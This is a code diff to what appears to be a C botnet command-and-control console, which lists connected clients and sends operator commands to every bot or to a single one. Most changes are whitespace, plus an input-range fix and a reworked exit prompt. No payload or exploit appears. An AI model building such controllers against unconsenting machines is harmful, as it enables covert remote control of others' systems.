@@ -66,7 +66,7 @@ void* handle_connection(void* arg)
     socklen_t client_addr_size;
     int new_fd;
     int fd_count = 1;
-    
+
     printf("[+] Looking for connections\n");
 
     while(1)
@@ -125,10 +125,10 @@ void* handle_connection(void* arg)
                             // Oops, our recv call failed.
                             printf("[-] Unable to recieve hostname from new client.\n");
                         }
-                        
+
                         // Overwrite the newline char with a null terminator
                         recieved_data[bytes_recv-1] = '\0';
-                        
+
                         new_con->hostname = malloc(bytes_recv);
                         sprintf(new_con->hostname, "%s", recieved_data);
                         printf("New Connection from %s\n", new_con->hostname);
@@ -163,7 +163,7 @@ int append_pfds(struct pollfd *pfds, int new_fd, int fd_count)
 void* bot_command(void* arg)
 
 {
-    
+
     char data[1024];
 
     connection* head = (connection *)arg;
@@ -171,7 +171,7 @@ void* bot_command(void* arg)
 
     while(1)
     {
-        
+
         // Prompt user for input and remove trailing newline
         // Indicate user is in 'console' control
         printf("[Console] >> ");
@@ -209,12 +209,12 @@ void* bot_command(void* arg)
             {
                 printf("[-] No connections!\n");
             }
-            
+
             // Release lock
              pthread_mutex_unlock(&mutex);
         }
-        
-        
+
+
         // Enter 'command' control
         else if (strcmp(data, "command") == 0)
         {
@@ -264,11 +264,11 @@ void* bot_command(void* arg)
                 }
 
 
-                
+
 
                 // Send command to ALL connections except listener
                 else if (strcmp(data, "all") == 0)
-                {   
+                {
                     //this allows consecutive command message to all clients
                     while(1)
                     {
@@ -311,21 +311,21 @@ void* bot_command(void* arg)
                 // Send command to SINGLE client
                 else if (strcmp(data, "single") == 0)
                 {
-                    
+
                     // Prompt user for input, remove trailing newline and convert input to int
                     printf("[Command][Single] Enter client: ");
                     fgets(data, sizeof(data), stdin);
                     data[strcspn(data, "\n")] = 0;
                     int num = atoi(data);
-                  
+
                     // Sanitise user input
-                    if (num > (count_connections(head) - 1))
+                    if (num < 1 || num > (count_connections(head) - 1))
                     {
                       printf("[-] No such connection %d\n", num);
                       printf("[-] The current number of connections is %d\n", (count_connections(head) - 1));
                       continue;
                     }
-                  
+
                     // Find the correct client in the list
                     int i = 0;
                     tmp = head;
@@ -334,7 +334,7 @@ void* bot_command(void* arg)
                       tmp = tmp->next;
                       i++;
                     }
-                  
+
                     //while loop allows consecutive command message to the client
                     while(1)
                     {
@@ -342,12 +342,12 @@ void* bot_command(void* arg)
                         printf("[command][single][%d] Enter command: ", num);
                         fgets(data, sizeof(data), stdin);
                         data[strcspn(data, "\n")] = 0;
-                        
+
                         if (strcmp(data,"back") == 0)
                         {
                             break;
                         }
-                        else 
+                        else
                         {    // Set lock
                             pthread_mutex_lock(&mutex);
 
@@ -383,11 +383,12 @@ void* bot_command(void* arg)
         // Exit control of bot
         else if (strcmp(data, "exit") == 0)
         {
-            printf("Are You Sure? yes/no\n");
-            fgets(data, sizeof(data), stdin);
-            data[strcspn(data, "\n")] = 0;  
             while(1)
             {
+                printf("Are You Sure? yes/no\n");
+                fgets(data, sizeof(data), stdin);
+                data[strcspn(data, "\n")] = 0;
+                
               if (strcmp(data,"yes") == 0)
               {
                   printf("\nExiting...  \n");
@@ -419,7 +420,7 @@ void print_welcome_message()
     printf("This is the console page\n");
     printf("Please enter <help> to display a list of available commands\n");
     printf("Enter <exit> to terminate the program\n\n");
-    
+
     return;
 }
 
